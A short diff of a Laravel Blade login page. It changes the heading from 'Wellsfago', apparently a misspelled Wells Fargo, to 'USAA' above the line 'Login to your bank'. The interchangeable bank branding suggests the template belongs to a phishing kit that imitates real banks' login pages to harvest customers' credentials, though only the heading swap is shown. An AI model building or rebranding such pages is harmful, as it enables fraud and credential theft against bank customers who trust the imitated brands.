@@ -13,7 +13,7 @@
 <p class="alert {{ Session::get('alert-class', 'alert-info') }}">{{ Session::get('message') }}</p>
 @endif 
 <div style="display: flex; flex-direction: column; justify-content: center; align-items: center;">
-    <h2 style="font-weight: 500;">Wellsfago</h2>
+    <h2 style="font-weight: 500;">USAA</h2>
   <p>Login to your bank</p>
     
 </div>
